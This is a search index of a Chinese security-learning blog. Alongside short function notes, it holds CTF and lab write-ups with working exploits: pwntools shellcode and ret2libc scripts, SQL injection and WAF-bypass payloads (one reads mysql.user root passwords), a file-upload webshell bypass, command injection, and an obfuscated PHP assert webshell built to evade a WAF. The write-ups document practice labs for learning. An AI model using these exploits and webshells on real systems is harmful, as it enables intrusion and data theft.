<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Mysql函数用法</title>
    <url>/2019/07/25/Mysql%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li>count()：汇总数据函数</li>
<li>rand()：随机输出一个小于1的正数</li>
<li>floor()：把输出的结果取整</li>
<li>group by语句：把结果分组输出</li>
<li>concat()：连接两条语句</li>
</ol>
]]></content>
      <categories>
        <category>数据库学习</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>函数用法</tag>
      </tags>
  </entry>
  <entry>
    <title>Hitcon lab1</title>
    <url>/2019/04/17/Hitcon-lab1/</url>
    <content><![CDATA[<p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
<pre><code>Hitcon这个是le3ding大佬推给我的


这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git


——————————分割线——————————

lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法

用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag

将if(password == magic)改为if(password ！= magic)

运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 备份文件 wirteup</title>
    <url>/2018/11/26/bugku%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6wirteup/</url>
    <content><![CDATA[<p>备份文件一般情况是在后缀名后加的<em>.swp，</em>.bak</p>
<p>利用==比较漏洞</p>
<p>md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)</p>
<a id="more"></a>
<p>如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 构造函数 wirteup</title>
    <url>/2018/11/28/bugku%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0wirteup/</url>
    <content><![CDATA[<?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['uname']) and isset($_POST['passwd'])) {
    if ($_GET['uname'] == $_POST['passwd'])

        print 'passwd can not be uname.';

    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))

        die('Flag: '.$flag);

    else

        print 'sorry!';

}
?>

<p> if (sha1($_GET[‘uname’]) === sha1($_POST[‘passwd’])</p>
<p>构造数组  ?id=margin&amp;uname[ ]=1</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hitcon_lab4</title>
    <url>/2019/04/24/Hitcon-lab4/</url>
    <content><![CDATA[<p>lab4是一道 return to libc 的题，</p>
<pre><code>首先checksec一下</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc067abaa659.png" alt></p>
<pre><code>可以看到没有开栈保护，开了NX了，可以栈溢出

file 一下 ret2lib ，返回32位

用ida打开文件分析一下</code></pre><a id="more"></a>

<p><img src="https://i.loli.net/2019/04/24/5cc068d80b6c5.png" alt></p>
<pre><code>这里两个地方值得注意：
    1、see_something()这个函数可以将你输入的地址找到其在运行中的真实地址

    2、像read，puts这样简单的函数可以被用来寻找偏移量

通过这两点可以用see_something()这个函数，将puts函数的真实地址返回出来

接下来就是找到libc的真实地址，计算偏移量，然后计算出system的真实地址，最后是计算出&quot;bin/sh&quot;真实地址拿到shell

exp：

#-*-coding:utf8-*-
from pwn import *

io = process(&quot;./ret2lib&quot;)
elf = ELF(&quot;./ret2lib&quot;)

libc = ELF(&quot;/lib32/libc.so.6&quot;)

puts_libc = libc.symbols[&quot;puts&quot;]
print &quot;puts_libc&quot; + hex(puts_libc) 

system_libc = libc.symbols[&quot;system&quot;]

binsh_libc = libc.search(&apos;/bin/sh&apos;).next()
print &quot;binsh_libc&quot; + hex(binsh_libc)

puts_plt = elf.plt[&quot;puts&quot;]
print &quot;puts_plt:&quot; + hex(puts_plt)

puts_got = elf.got[&quot;puts&quot;]
print &quot;puts_got:&quot; + hex(puts_got)

io.recvuntil(&quot;:&quot;)
io.sendline(str(puts_got))

io.recvuntil(&apos;0x&apos;)
puts_addr = int(io.reuntil(&apos;\n&apos;),16)
print &quot;puts_addr:&quot; + hex(puts_addr) //获得puts地址

main = 0x0804857d  //通过ida找出mian的地址

offset = puts_addr - puts_libc  //计算偏移量
system_addr = system_libc + offset  //system地址
binsh =  binsh_libc + offset  // bin/sh地址

io.recvuntil(&quot;:&quot;)
payload = &apos;a&apos; * 60
payload += p32(system_addr) + p32(main) + p32(binsh)


io.sendline(payload)
io.interactive()</code></pre><p><img src="https://i.loli.net/2019/04/24/5cc06c3cdfb2d.png" alt></p>
<pre><code>拿到shell</code></pre>]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku 文件上传 wirteup</title>
    <url>/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/</url>
    <content><![CDATA[<p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
<a id="more"></a>

<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br> <img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/c2zulbcl.bmp" alt></p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>calc2</title>
    <url>/2019/04/19/calc2/</url>
    <content><![CDATA[<p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
<a id="more"></a>

<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面

接着打算直接cat flag，然而并不行

if(!empty($_GET)){
$str=$_GET[&quot;calc&quot;];
if(strpos($str,&quot;#&quot;)!==false)
    die;
if(strpos($str,&quot;`&quot;)!==false)
    die;
if(strpos($str,&quot;flag&quot;)!==false)
    die;

成了,flag被过滤了

嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
<pre><code>拿到flag</code></pre>]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 file_get_contents wirteup</title>
    <url>/2018/12/05/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/</url>
    <content><![CDATA[<p>file_get_contents 用于 将整个文件读入一个字符串</p>
<p>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。</p>
<p>用法<br>$homepage = file_get_contents(‘filename’);</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 sql绕过 wirteup</title>
    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sql%E7%BB%95%E8%BF%87-wirteup/</url>
    <content><![CDATA[<p>首先 要对id注入。首先试一下order by，发现错误，可能是关键字过滤。</p>
<p>试了试/**/还是不行，改用&lt;&gt;发现可以了</p>
<p>payload如下<br>、<br>?id=1 ord&lt;&gt;er by 3 –<br>?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,2,3 –<br>剩下的正常注入</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf web easy calc wirteup</title>
    <url>/2020/04/02/buuctf-web-easy-calc-wirteup/</url>
    <content><![CDATA[<p>此题考查php文件解析漏洞</p>
<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。<br>例如：/?foo=bar变成Array([foo] =&gt; “bar”)。<br>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
<a id="more"></a>
<p>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。<br>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p>/news.php?%20news[id%00=42”+AND+1=0–</p>
<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>        1.删除空白符<br>        2.将某些字符转换为下划线（包括空格）</p>
]]></content>
  </entry>
  <entry>
    <title>hitcon  lab3 </title>
    <url>/2019/04/18/hitcon-lab3/</url>
    <content><![CDATA[<p>lab3这道题是一个基本的栈溢出</p>
<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，

由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路

首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><a id="more"></a>

<p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
<pre><code>地址为0x0804A060

直接上exp：

from pwn import *

&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;

context.log_level = &apos;debug&apos;

io = process(&apos;ret2sc&apos;)

sc = asm(shellcraft.sh())

ret2 = &apos;A&apos;*32 + p32(0x0804A060)

io.sendafter(&apos;Name:&apos;,sc)

io.sendafter(&apos;best:&apos;,ret2)

io.interactive()

直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
<pre><code>ok，拿到shell，直接cat flag就行了</code></pre>]]></content>
      <categories>
        <category>逆向学习</category>
      </categories>
      <tags>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title>php函数学习</title>
    <url>/2019/09/25/php%E5%87%BD%E6%95%B0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>var_dump()<br>用于输出变量的相关信息。 显示关于一个或多个表达式的结构信息，包括表达式的类型与值。</p>
<p>file_get_contents（）<br>把整个文件读入一个字符串中<br>函数是用于把文件的内容读入到一个字符串中的首选方法.file()函数同样可以</p>
<p>scandir（）<br>返回指定目录中的文件和目录的数组。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python库</title>
    <url>/2019/07/25/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>import  random<br>随机整数：print random.randint(1,50)<br>随机选取0到100间的(奇)偶数：print random.randrange(0, 101, （1）2)<br>随机浮点数：print random.random() 无范围 ；print random.uniform(1, 10) 有范围</p>
<a id="more"></a>
<p>随机字符：print random.choice(‘abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()’)<br>多个字符中生成指定数量的随机字符：print random.sample(‘zyxwvutsrqponmlkjihgfedcba’,5)<br>从a-zA-Z0-9生成指定数量的随机字符：ran_str = ‘’.join(random.sample(string.ascii_letters + string.digits, 8))  print ran_str<br>多个字符中选取指定数量的字符组成新字符串：print ‘’.join(random.sample([‘z’,’y’,’x’,’w’,’v’,’u’,’t’,’s’,’r’,’q’,’p’,’o’,’n’,’m’,’l’,’k’,’j’,’i’,’h’,’g’,’f’,’e’,’d’,’c’,’b’,’a’], 5))<br>随机选取字符串：print random.choice([‘剪刀’, ‘石头’, ‘布’])<br>打乱排序items = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]   print random.shuffle(items)</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 sqli wirteup</title>
    <url>/2018/12/12/i%E6%98%A5%E7%A7%8B-sqli-wirteup/</url>
    <content><![CDATA[<p>sql注入时，逗号被过滤后可用payload</p>
<p>select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97);</p>
<p>127’ UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>
<p>select case when substring((select password from mysql.user where user=’root’) from 1 for 1)=’e’ then sleep(5) else 0 end #</p>
<p>substring((select password from mysql.user where user=’root’) from -1）=’e’</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 模拟上传 wirteup</title>
    <url>/2018/12/02/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/</url>
    <content><![CDATA[<p>网址    <a href="http://106.75.72.168:2222/" target="_blank" rel="noopener">http://106.75.72.168:2222/</a></p>
<p>Sorry. You have no permissions.</p>
<p>既然没有提示，也没有其他的链接，那么可能有以下几种可能：<br>       1、敏感文件泄漏<br>       2、跳转<br>       <a id="more"></a><br>       3、cookie / session<br>       第一个想法在经过扫描器扫描之后就放弃了，因为只看到index.php，还有/upload/，但是在访问的时候是403<br>       第二个在抓包的时候也没有看到有跳转<br>       只剩下第三个</p>
<p>抓包发现cookie    Cookie: role=Zjo1OiJ0aHJmZyI7”</p>
<p>base64解码后   “ f:5:”thrfg”; 初步判断为rot13 thrfg为guest<br>将其改为base64(rot13(admin))</p>
<!-- $filename = $_POST['filename']; $data = $_POST['data']; -->

<p>发现源代码</p>
<p>post提交 filename=1.php&amp;data[]=<?php phpinfo();?>得到flag</p>
]]></content>
      <categories>
        <category>CTF学习</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>ctf学习</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2019/12/25/sqli-lab/</url>
    <content><![CDATA[<p>前言</p>
<pre><code>最近在研究sql注入，sqli-labs是一个专业的sql注入练习平台，于是自己搭建了一个，记录一下学习过程。</code></pre><p>Less-1</p>
<p> 根据提示可以知道，这是一道单引号注入的题目<br> 首先他让我们输入ID<br><img src="/2019/12/25/sqli-lab/05ab1d2d3f4f5421f749a046d8f3a56.png" alt><br>    先get一个参数进行测试</p>
<a id="more"></a>    
<p><img src="/2019/12/25/sqli-lab/d336f99bd2f6e61ef828e16e4b4d2b0.png" alt><br>    正常回显，根据提示进行单引号测试<br><img src="/2019/12/25/sqli-lab/b8c6f552da136996e0fb2847121c8d2.png" alt><br>    可以发现已经报错，这里先把报错语句拿出来<br>    ‘’1’’ LIMIT 0,1’ at line 1<br>    这里首尾两个’是输出用的而 ‘1’’ 中的1’便是你输入的参数值<br>    将这个语句放入正常语句中进行分析<br>    select * from A where id =’1’’ limit 0,1<br>    可以发现正是由于id值中传入了一个 ‘ ,使得正常的语句多了一个 ‘ 发生了错误。<br>    所以我们可以利用这一点，构造我们需要的语句<br>    select * from A where id =’1’ 需要的注入语句 –+’ limit 0,1<br>    这样我们就可以通过不同的注入语句获得我们需要的信息<br>    注入的通常流程：<br>        1、确定现有sql语句到底查询了多少个字段以及各字段的类型<br>        2、确定了字段个数再查询显示位<br>        3、在从当前显示位上查询出当前数据库、当前用户等我们所需要的数据<br>    实际操作一下<br>    构造字段查询语句<br>    payload：’ order by 3 –+<br>    可以看到页面正常回显<br><img src="/2019/12/25/sqli-lab/3785c8fcbaff654858efb5899d54a93.png" alt><br>    将3改为4<br><img src="/2019/12/25/sqli-lab/a30015d7c3cbff602cc0443c9ffd91e.png" alt><br>    发生报错，证明只存在三个字段<br>    接着确定可以回显的字段<br>    payload：-1’ union select 1,2,3 –+<br><img src="/2019/12/25/sqli-lab/81e3539614352a2e5bf5eece18a765f.png" alt><br>    可以看到2，3被显示在页面上，也就是说我们要将查询语句构造在2，3号位才可以获得相应的数据<br>    下面列出几个常用的查询语句：<br>        1、查询表：-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_scheme= database() –+<br>        2、查询列：-1’ union selecr 1,group_concat(column_name),3 from information_schema.conluns where table_name=”users” –+<br>        3、查询字段：-1’ union select 1,group_concat(A,B,C),3 from users –+<br>    注：仅使用于MySQL数据库&gt;=5.0.1以上版本</p>
<pre><code>-------------------分割线------------------</code></pre>]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqli-lab</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>过狗一句话小技巧</title>
    <url>/2018/11/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<?php $poc="a#s#s#e#r#t"; 

$poc_1=explode("#",$poc);

$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];

$poc_2($_GET['s']) 

?>



<pre><code>1. s=print_r(scandir(&apos;./&apos;)) 然后读取flag.txt

2. s=print_r(glob(&quot;*.*&quot;)) 然后读取show_source(flag.txt)

3. 使用file_get_contents(flag.txt)读取文件

eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</code></pre>]]></content>
      <categories>
        <category>SQl注入</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>注入技巧</tag>
      </tags>
  </entry>
</search>
